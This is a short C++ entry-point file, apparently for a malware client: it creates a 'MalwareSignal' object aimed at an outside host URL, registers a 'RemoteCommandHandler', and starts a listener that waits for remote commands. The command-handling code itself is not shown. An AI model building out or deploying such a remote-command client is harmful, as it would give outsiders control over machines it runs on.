#include <iostream>
#include <memory>
#include <random>
#include "include/controller/Listener.h"
#include "include/model/MalwareSignal.h"
#include "include/model/RemoteCommandHandler.h"

using namespace std;


int main() {
    const string room = "ROOM";
    const string clientId = "1234";
    const string host = "https://glitch-signal.vercel.app/";
    const string username = "USERNAME";

    auto signal = make_shared<MalwareSignal>(room, clientId, host, username);

    // Registers the message handler before connecting/listening.
    auto handler = make_shared<RemoteCommandHandler>(signal);

    Listener mode(signal, handler);

    mode.run();

    return 0;
}